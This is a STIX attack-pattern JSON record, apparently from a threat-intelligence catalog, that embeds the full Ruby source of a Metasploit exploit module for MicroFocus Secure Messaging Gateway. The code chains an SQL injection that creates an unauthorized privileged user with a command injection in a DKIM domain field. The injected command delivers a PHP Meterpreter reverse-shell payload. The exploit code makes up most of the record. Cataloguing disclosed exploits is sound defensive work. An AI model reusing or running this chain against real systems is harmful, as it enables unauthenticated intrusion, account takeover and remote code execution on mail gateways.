{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--92a064c1-39ab-4aaf-ad56-6545cc89741f",
    "created": "2024-08-14T17:03:43.729752Z",
    "modified": "2024-08-14T17:03:43.729757Z",
    "name": "\"MicroFocus Secure Messaging Gateway Remote Code Execution\"",
    "description": " This module exploits a SQL injection and command injection vulnerability in MicroFocus Secure Messaging Gateway. An unauthenticated user can execute a terminal command under the context of the web user.  One of the user supplied parameters of API endpoint is used by the application without input validation and/or parameter binding which leads to SQL injection vulnerability. Successfully exploiting this vulnerability gives a ability to add new user onto system. manage_domains_dkim_keygen_request.php endpoint is responsible for executing an operation system command. It's not possible to access this endpoint without having a valid session.  Combining these vulnerabilities gives the opportunity execute operation system commands under the context of the web user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/microfocus_secure_messaging_gateway.rb",
            "external_id": "microfocus_secure_messaging_gateway.rb"
        },
        {
            "source_name": "reference",
            "url": "https://pentest.blog/unexpected-journey-6-all-ways-lead-to-rome-remote-code-execution-on-microfocus-secure-messaging-gateway/"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-12464"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-12465"
        },
        {
            "source_name": "reference",
            "url": "https://support.microfocus.com/kb/doc.php?id=7023132"
        },
        {
            "source_name": "reference",
            "url": "https://support.microfocus.com/kb/doc.php?id=7023133"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MicroFocus Secure Messaging Gateway Remote Code Execution\",\n      'Description'    => %q{\n        This module exploits a SQL injection and command injection vulnerability in MicroFocus Secure Messaging Gateway.\n        An unauthenticated user can execute a terminal command under the context of the web user.\n\n        One of the user supplied parameters of API endpoint is used by the application without input validation and/or parameter binding,\n        which leads to SQL injection vulnerability. Successfully exploiting this vulnerability gives a ability to add new user onto system.\n        manage_domains_dkim_keygen_request.php endpoint is responsible for executing an operation system command. It's not possible\n        to access this endpoint without having a valid session.\n\n        Combining these vulnerabilities gives the opportunity execute operation system commands under the context\n        of the web user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Mehmet Ince <mehmet@mehmetince.net>' # author & msf module\n        ],\n      'References'     =>\n        [\n          ['URL', 'https://pentest.blog/unexpected-journey-6-all-ways-lead-to-rome-remote-code-execution-on-microfocus-secure-messaging-gateway/'],\n          ['CVE', '2018-12464'],\n          ['CVE', '2018-12465'],\n          ['URL', 'https://support.microfocus.com/kb/doc.php?id=7023132'],\n          ['URL', 'https://support.microfocus.com/kb/doc.php?id=7023133']\n        ],\n      'DefaultOptions'  =>\n        {\n          'Payload' => 'php/meterpreter/reverse_tcp',\n          'Encoder' => 'php/base64'\n        },\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [[ 'Automatic', { }]],\n      'Privileged'     => false,\n      'DisclosureDate' => '2018-06-19',\n      'DefaultTarget'  => 0\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The URI of the vulnerable instance', '/'])\n      ]\n    )\n\n    self.needs_cleanup = true\n  end\n\n  def execute_query(query)\n    #\n    # We have a very rare SQLi case in here. Normally, it's would be very easy to exploit it by using time-based techniques\n    # but since we are able to use stacked-query approach, following form of payload is required in order to be able\n    # get back the output of query !\n    #\n    sql = rand_text_alphanumeric(3 + rand(3))\n    sql << \"') LEFT JOIN ScanEngineProperty AS ScanEngineBindAddressPlain ON ScanEngineBindAddressPlain.idScanEngine=ScanEngineProperty.idScanEngine \"\n    sql << \"LEFT JOIN ScanEngineProperty AS ScanEngineBindAddressSsl ON ScanEngineBindAddressSsl.idScanEngine=ScanEngineProperty.idScanEngine \"\n    sql << \"LEFT JOIN ScanEngineProperty AS ScanEngineEnableSsl ON ScanEngineEnableSsl.idScanEngine=ScanEngineProperty.idScanEngine; \"\n    sql << query\n    sql << \"; -- \"\n    sql << rand_text_alphanumeric(3 + rand(3))\n\n    send_request_cgi(\n      'method'  => 'POST',\n      'uri'     =>  normalize_uri(target_uri.path, 'api', '1', 'enginelist.php'),\n      'vars_post' => {\n        'appkey' => sql\n      }\n    )\n\n  end\n\n  def something_went_wrong\n    fail_with Failure::Unknown, 'Something went wrong'\n  end\n\n  def check\n    r = rand_text_numeric(15..35)\n    res = execute_query(\"SELECT #{r}\")\n    unless res\n      vprint_error 'Connection failed'\n      return CheckCode::Unknown\n    end\n    unless res.code == 200 && res.body.include?(r)\n      return CheckCode::Safe\n    end\n    CheckCode::Vulnerable\n  end\n\n  def implant_payload(cookie)\n    print_status('Creating a domain record with a malformed DKIM data')\n    p = [\n      {\n        :id => 'temp_0',\n        :Description => rand_text_alpha(5),\n        :DkimList => [\n          {\n            :Domain => \"$(php -r '#{payload.encoded}')\",\n            :Selector => '',\n            :TempId => 'tempDkim_1'\n          }\n        ]\n      }\n    ].to_json\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'admin', 'contents', 'ou', 'manage_domains_save_data.json.php'),\n      'cookie' => cookie,\n      'vars_get' => {\n        'cache' => 0,\n      },\n      'vars_post' => {\n        'StateData' => '[{\"ouid\":1}]',\n        'SaveData' => p\n      }\n    })\n\n    if res && res.code == 200 && res.body.include?('DbNodeId')\n      # Defining as global variable since we need to access them later within clean up function.\n      begin\n        @domainid  = res.get_json_document['Nodes'][0]['DbNodeId']\n        @dkimid  = res.get_json_document['Nodes'][1]['DbNodeId']\n      rescue => e\n        fail_with Failure::UnexpectedReply, \"Something went horribly wrong while implanting the payload : #{e.message}\"\n      end\n      print_good('Payload is successfully implanted')\n    else\n      something_went_wrong\n    end\n  end\n\n  def create_user\n    # We need to create an user by exploiting SQLi flaws so we can reach out to cmd injection\n    # issue location where requires a valid session !\n    print_status('Creating a user with appropriate privileges')\n\n    # Defining as global variable since we need to access them later within clean up function.\n    @username = rand_text_alpha_lower(5..25)\n    @userid = rand_text_numeric(6..8)\n    query = \"INSERT INTO account VALUES (#{@userid}, 1, '#{@username}', '0', '', 1,61011);INSERT INTO UserRole VALUES (#{@userid},#{@userid},1),(#{@userid.to_i-1},#{@userid},2)\"\n\n    execute_query(query)\n    res = execute_query(\"SELECT * FROM account WHERE loginname = '#{@username}'\")\n\n    if res && res.code == 200 && res.body.include?(@username)\n      print_good(\"User successfully created. Username : #{@username}\")\n    else\n      something_went_wrong\n    end\n  end\n\n  def login\n    print_status(\"Authenticating with created user\")\n    res = send_request_cgi(\n      'method'  => 'POST',\n      'uri'     =>  normalize_uri(target_uri.path, 'security', 'securitygate.php'),\n      'vars_post' => {\n        'username' => @username,\n        'password' => rand_text_alpha_lower(5..25),\n        'passwordmandatory' => rand_text_alpha_lower(5..25),\n        'LimitInterfaceId' => 1\n      }\n    )\n    if res && res.code == 200 && res.body.include?('/ui/default/index.php')\n      print_good('Successfully authenticated')\n      cookie = res.get_cookies\n    else\n      something_went_wrong\n    end\n    cookie\n  end\n\n  def exploit\n    unless check == CheckCode::Vulnerable\n      fail_with Failure::NotVulnerable, 'Target is not vulnerable'\n    end\n\n    create_user\n    cookie = login\n    implant_payload(cookie)\n\n    print_status('Triggering an implanted payload')\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'admin', 'contents', 'ou', 'manage_domains_dkim_keygen_request.php'),\n      'cookie' => cookie,\n      'vars_get' => {\n        'cache' => 0,\n      },\n      'vars_post' => {\n        'DkimRecordId' => @dkimid\n      }\n    })\n\n  end\n\n  def on_new_session(session)\n    print_status('Cleaning up...')\n    cmd = \"\"\n    cmd << 'PGPASSWORD=postgres psql -U postgres -d SecureGateway -c \"'\n    cmd << \"DELETE FROM account WHERE loginname ='#{@username}';\"\n    cmd << \"DELETE FROM UserRole WHERE idaccount = #{@userid};\"\n    cmd << \"DELETE FROM Domain WHERE iddomain = #{@domainid};\"\n    cmd << \"DELETE FROM DkimSignature WHERE iddkimsignature = #{@dkimid};\"\n    cmd << '\"'\n    session.shell_command_token(cmd)\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2018-06-19",
    "x_mitre_platforms": [
        "['php']"
    ]
}